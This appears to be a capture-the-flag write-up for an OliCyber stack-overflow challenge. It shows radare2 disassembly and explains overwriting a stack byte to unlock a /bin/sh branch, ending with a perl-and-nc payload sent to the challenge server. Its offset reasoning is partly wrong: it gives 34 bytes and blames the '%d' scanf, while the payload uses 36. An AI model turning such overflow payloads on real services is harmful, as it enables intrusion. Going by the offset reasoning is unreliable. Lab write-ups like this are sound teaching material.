# URL
https://training.olicyber.it/challenges#challenge-104
# Concept
* stack buffer overflow
* variable overwrite
* overwrite to win
# Method of solve
* after downloading and making the binary executable, we run the binary
* the binary takes in two inputs, then exits
* this is what the main function disassembly looks like in Radare2
```
┌ 185: int main (int argc, char **argv, char **envp);                                                         
│ afv: vars(3:sp[0x14..0x38])                                                                                 
│           0x00401195      55             push rbp                                                           
│           0x00401196      4889e5         mov rbp, rsp                                                       
│           0x00401199      4883ec30       sub rsp, 0x30                                                      
│           0x0040119d      b800000000     mov eax, 0                                                                           
│           0x004011a2      e8bfffffff     call sym.init                                                                        
│           0x004011a7      c645f400       mov byte [var_ch], 0                                                                 
│           0x004011ab      488d3d560e..   lea rdi, str.Quanti_anni_hai_ ; 0x402008 ; "Quanti anni hai?"                        
│           0x004011b2      e879feffff     call sym.imp.puts           ; int puts(const char *s)                                
│           0x004011b7      488d45d0       lea rax, [var_30h]                                                                   
│           0x004011bb      4883c020       add rax, 0x20               ; 32                                                     
│           0x004011bf      4889c6         mov rsi, rax
│           0x004011c2      488d3d500e..   lea rdi, [0x00402019]       ; "%d"
│           0x004011c9      b800000000     mov eax, 0
│           0x004011ce      e89dfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x004011d3      488d3d420e..   lea rdi, str.Come_ti_chiami_ ; 0x40201c ; "Come ti chiami?"
│           0x004011da      e851feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011df      488d45d0       lea rax, [var_30h]
│           0x004011e3      4889c6         mov rsi, rax
│           0x004011e6      488d3d3f0e..   lea rdi, [0x0040202c]       ; "%s"
│           0x004011ed      b800000000     mov eax, 0
│           0x004011f2      e879feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x004011f7      0fb645f4       movzx eax, byte [var_ch]
│           0x004011fb      84c0           test al, al
│       ┌─< 0x004011fd      743c           je 0x40123b
│       │   0x004011ff      488d45d0       lea rax, [var_30h]
│       │   0x00401203      4889c6         mov rsi, rax
│       │   0x00401206      488d3d220e..   lea rdi, str.Ciao__s__bentornato_:__n ; 0x40202f ; "Ciao %s, bentornato :)\n"
│       │   0x0040120d      b800000000     mov eax, 0
│       │   0x00401212      e849feffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x00401217      8b45f0         mov eax, dword [var_10h]
│       │   0x0040121a      89c6           mov esi, eax
│       │   0x0040121c      488d3d240e..   lea rdi, str.Hai__d_anni._n ; 0x402047 ; "Hai %d anni.\n"
│       │   0x00401223      b800000000     mov eax, 0
│       │   0x00401228      e833feffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x0040122d      488d3d210e..   lea rdi, str._bin_sh        ; 0x402055 ; "/bin/sh"
│       │   0x00401234      e817feffff     call sym.imp.system         ; int system(const char *string)
│      ┌──< 0x00401239      eb0c           jmp 0x401247
│      │└─> 0x0040123b      488d3d1e0e..   lea rdi, str.Non_hai_il_badge__mi_dispiace. ; 0x402060 ; "Non hai il badge, mi dispiace."                                                                                                                                                      
│      │    0x00401242      e8e9fdffff     call sym.imp.puts           ; int puts(const char *s)
│      │    ; CODE XREF from main @ 0x401239(x)
│      └──> 0x00401247      b800000000     mov eax, 0
│           0x0040124c      c9             leave
└           0x0040124d      c3             ret
```
* we see there is a branch of the main function which opens up a shell for us:
```
│       │   0x004011ff      488d45d0       lea rax, [var_30h]
│       │   0x00401203      4889c6         mov rsi, rax
│       │   0x00401206      488d3d220e..   lea rdi, str.Ciao__s__bentornato_:__n ; 0x40202f ; "Ciao %s, bentornato :)\n"
│       │   0x0040120d      b800000000     mov eax, 0
│       │   0x00401212      e849feffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x00401217      8b45f0         mov eax, dword [var_10h]
│       │   0x0040121a      89c6           mov esi, eax
│       │   0x0040121c      488d3d240e..   lea rdi, str.Hai__d_anni._n ; 0x402047 ; "Hai %d anni.\n"
│       │   0x00401223      b800000000     mov eax, 0
│       │   0x00401228      e833feffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x0040122d      488d3d210e..   lea rdi, str._bin_sh        ; 0x402055 ; "/bin/sh"
│       │   0x00401234      e817feffff     call sym.imp.system         ; int system(const char *string)
```
* but in order to access that branch of the program, the program must have a certain variable set:
```
│           0x004011f7      0fb645f4       movzx eax, byte [var_ch]
│           0x004011fb      84c0           test al, al
│       ┌─< 0x004011fd      743c           je 0x40123b
```
* before the `test` instruction, the byte in the `[var_ch]` memory address is loaded into the `eax` register, and if the contents of `var_ch` is smaller than size of `eax`, then the rest of the register is filled out with zeros
* the `test` instruction is used to set flags in the binary, most importantly the zero flag (ZF). If the value of `al` (the `var_ch` variable) is `0`, then the ZF will be set to `1`
* the je instruction will execute if the ZF is set to `1`, which is the default behavior of the program
* in order to change the value of the `var_ch` variable, we have to do stack buffer overflow
* since this is a 64-bit binary the `var_ch` variable is stored at `rbp-0xc`
* the first user-input variable is stored at `var_30h`, which is `rbp-0x30`
```
│           0x004011b7      488d45d0       lea rax, [var_30h]                                                                   
│           0x004011bb      4883c020       add rax, 0x20               ; 32                                                     
│           0x004011bf      4889c6         mov rsi, rax
│           0x004011c2      488d3d500e..   lea rdi, [0x00402019]       ; "%d"
│           0x004011c9      b800000000     mov eax, 0
│           0x004011ce      e89dfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
```
* The user input is being recorded by the `scanf` function, which is a memory unsafe function, and can be used for buffer overflow attacks
* The difference between the memory addresses of the `var_ch` variable and the `var_30h` variable is 34, which means we should send at least 34 bytes to the binary to overflow into the `var_ch` variable and overwriting it, leading to an opening of a shell
* this payload will solve the challenge:
```
(perl -e 'print "A" x 36 . "Z" . "\x0a"'; cat) | nc privateclub.challs.olicyber.it 10015
```
